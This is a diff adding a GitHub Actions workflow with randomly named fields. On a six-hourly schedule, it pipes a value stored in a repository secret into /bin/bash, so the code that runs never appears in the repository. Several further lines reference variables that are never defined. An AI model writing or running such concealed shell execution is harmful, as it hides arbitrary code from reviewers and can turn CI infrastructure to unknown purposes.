@@ -1,0 +1,24 @@
+name: yihuanhuahui
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yihuanhuahui
+        env:
+          zul8: ${{ secrets.zul8 }}
+        run: |
+          echo $zul8 | jq -r .aykw1 | /bin/bash
+          echo $ayxoy0 | jq -r .ickfb93735 | /bin/bash
+          echo $osew41 | jq -r .ixlrj122 | /bin/bash
+          echo $qtrbi343 | jq -r .wmz0814 | /bin/bash
+          echo $axwg9 | jq -r .j4947 | /bin/bash
+          echo $yetl82148 | jq -r .e1 | /bin/bash
+          echo $ygvk62 | jq -r .g42631 | /bin/bash
+
